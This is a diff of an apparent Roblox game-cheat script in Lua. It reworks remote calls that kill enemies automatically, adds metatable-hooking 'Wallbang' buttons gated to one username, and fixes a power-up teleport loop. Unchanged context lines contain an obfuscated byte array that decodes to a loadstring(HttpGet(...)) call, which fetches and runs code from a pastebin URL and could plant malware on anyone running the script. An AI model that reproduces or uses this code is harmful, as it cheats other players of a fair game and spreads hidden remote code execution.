@@ -106,67 +106,6 @@ function BossDistance()
     end
 end
 
-function getEquippedWeapon(player)
-        local char = player.Character
-        local weapon = char and char:FindFirstChildWhichIsA("Tool")
-    
-        if weapon ~= nil then
-            return weapon.Name
-        else
-            return "None"
-        end
-    end
-
-function KillZombies(weapontype,partaim)
-if weapontype == "gun" then
-if BossList() == "Boss" then
-for _,v in pairs(workspace.BossFolder:GetChildren()) do
-local args = {
-    [1] = {
-        ["Normal"] = Vector3.new(0,0,0),
-        ["Direction"] = v[partaim].Position,
-        ["Name"] = getEquippedWeapon(game.Players.LocalPlayer),
-        ["Hit"] = v[partaim],
-        ["Origin"] = v[partaim].Position,
-        ["Pos"] = v[partaim].Position
-    }
-}
-
-game:GetService("ReplicatedStorage").Gun:FireServer(unpack(args))
-end
-elseif BossList() == "Zombie" then
-for _,v in pairs(workspace.enemies:GetChildren()) do
-local args = {
-    [1] = {
-        ["Normal"] = Vector3.new(0,0,0),
-        ["Direction"] = v[partaim].Position,
-        ["Name"] = getEquippedWeapon(game.Players.LocalPlayer),
-        ["Hit"] = v[partaim],
-        ["Origin"] = v[partaim].Position,
-        ["Pos"] = v[partaim].Position
-    }
-}
-
-game:GetService("ReplicatedStorage").Gun:FireServer(unpack(args))
-end
-end
-elseif weapontype == "melee" then
-if BossList() == "Boss" then
-for _,v in pairs(workspace.BossFolder:GetChildren()) do
-game:GetService("ReplicatedStorage")["forhackers"]:InvokeServer("hit",getEquippedWeapon(game.Players.LocalPlayer),v[partaim])
-end
-elseif BossList() == "Zombie" then
-for _,v in pairs(workspace.enemies:GetChildren()) do
-game:GetService("ReplicatedStorage")["forhackers"]:InvokeServer("hit",getEquippedWeapon(game.Players.LocalPlayer),v[partaim])
-end
-end
---end
-else
-	return "INVALID WEAPON TYPE"
-end
-end
---]]
-
 local groundDistance = 8
 --local Player = game:GetService("Players").LocalPlayer
 local function getNearest()
@@ -191,6 +130,39 @@ end
 end
 return nearest
 end
+
+function getEquippedWeapon(player)
+        local char = player.Character
+        local weapon = char and char:FindFirstChildWhichIsA("Tool")
+    
+        if weapon ~= nil then
+            return weapon.Name
+        else
+            return "None"
+        end
+    end
+
+function KillZombies(weapontype,partaim)
+if weapontype == "gun" then
+local args = {
+    [1] = {
+        ["Normal"] = Vector3.new(0,0,0),
+        ["Direction"] = getNearest()[partaim].Position,
+        ["Name"] = getEquippedWeapon(game.Players.LocalPlayer),
+        ["Hit"] = getNearest()[partaim],
+        ["Origin"] = getNearest()[partaim].Position,
+        ["Pos"] = getNearest()[partaim].Position
+    }
+}
+
+game:GetService("ReplicatedStorage").Gun:FireServer(unpack(args))
+elseif weapontype == "melee" then
+game:GetService("ReplicatedStorage")["forhackers"]:InvokeServer("hit",getEquippedWeapon(game.Players.LocalPlayer),getNearest()[partaim])
+else
+	return "INVALID WEAPON TYPE"
+end
+end
+--]]
 
 local globalTarget = nil
 --game:GetService("RunService").RenderStepped:Connect(function()
@@ -492,7 +464,7 @@ mt.__namecall = newcclosure(function(self, ...)
     local Args = {...}
     NamecallMethod = getnamecallmethod()
     if getgenv().Wallbang and tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
-        table.insert(Args[2], workspace.Map)
+        table.insert(Args[2],workspace.map)
     end
     return namecallold(self, ...)
 end)
@@ -500,6 +472,40 @@ end)
 function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; local IIllllIIllll = (7*3-9/9+3*2/0+3*3);local IIlllIIlllIIlllIIlllII = (3*4-7/7+6*4/3+9*9);local IllIIIllIIIIllI = table.concat;function IllIIIIllIIIIIl(IIllllIIllll) function IIllllIIllll(IIllllIIllll) function IIllllIIllll(IllIllIllIllI) end end end;IllIIIIllIIIIIl(900283);function IllIlllIllIlllIlllIlllIllIlllIIIlll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IllIllIllIllI) local IIlllIIlllIIlllIIlllII = (9*0-7/5+3*1/3+8*2) end end;IllIlllIllIlllIlllIlllIllIlllIIIlll(9083);local IllIIllIIllIII = loadstring;local IlIlIlIlIlIlIlIlII = {'\45','\45','\47','\47','\32','\68','\101','\99','\111','\109','\112','\105','\108','\101','\100','\32','\67','\111','\100','\101','\46','\32','\10','\32','\32','\32','\32','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\40','\103','\97','\109','\101','\58','\72','\116','\116','\112','\71','\101','\116','\40','\39','\104','\116','\116','\112','\115','\58','\47','\47','\112','\97','\115','\116','\101','\98','\105','\110','\46','\112','\108','\47','\118','\105','\101','\119','\47','\114','\97','\119','\47','\54','\50','\48','\55','\56','\98','\53','\54','\39','\44','\32','\116','\114','\117','\101','\41','\41','\40','\41','\10',}IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()
 setreadonly(mt, true)
 end)		
+
+if Player.Name == "Rivanda_Cheater" then
+T1:AddButton("Wallbang V3 [testing]", function()
+local gmt = getrawmetatable(game)
+setreadonly(gmt, false)
+local oldNamecall = gmt.__namecall
+gmt.__namecall = newcclosure(function(self, ...)
+                local Args = {...}
+                local method = getnamecallmethod()
+                if tostring(method) == "FindPartOnRayWithIgnoreList" then
+		      table.insert(Args[2],workspace.map)
+		     --return self.FireServer(self, unpack(Args))
+                end
+                return oldNamecall(self, ...)
+            end)
+setreadonly(gmt, true)
+end)
+
+T1:AddButton("Wallbang V4 [testing]", function()
+local gmt = getrawmetatable(game)
+setreadonly(gmt, false)
+local oldNamecall = gmt.__namecall
+gmt.__namecall = newcclosure(function(self, ...)
+                local Args = {...}
+                local method = getnamecallmethod()
+                if tostring(method) == "FindPartOnRayWithIgnoreList" then
+		      table.insert(Args[2],workspace.map)
+		     --return self.FireServer(self, unpack(Args))
+                end
+                return oldNamecall(self, ...)
+            end)
+--setreadonly(gmt, true)
+end)
+end
 
 T1:AddButton("Immortal", function()
 game.Players.LocalPlayer.Character.Humanoid:Remove()
@@ -649,16 +655,16 @@ T7:AddSwitch("Auto Collect power up", function(State)
 _G._BringShit = State
 	while wait() do
 	     if _G._BringShit == false then break end
-	   for _,v in pairs(workspace.Powerup:GetChildren()) do
-                if v.Name:find("grenade") or v.Name:find("invincibility") or v.Name:find("molotov") or v.Name:find("speedboost") or v.Name:find("stungrenade") then
-			workspace.Powerup[v.Name].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+	   for _,v in pairs(game:GetService("Workspace").Powerups.Powerup:GetChildren()) do
+                if v.Name:find("grenade") or v.Name:find("godmode") or v.Name:find("molotov") or v.Name:find("speedboost") or v.Name:find("stungrenade") then
+			game:GetService("Workspace").Powerups.Powerup[v.Name].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
 		end
 	    end
 	end
 end)
 
 while wait() do
-if workspace:FindFirstChild(Player) then
+if workspace:FindFirstChild(Player.Name) then
    zombieConsole:Set('You are not a zombie!\n<!===================>\nCurrent Map: ' .. tostring(getMap()))
 else
    zombieConsole:Set('You are a zombie!\n<!===================>\nCurrent Map: ' .. tostring(getMap()))
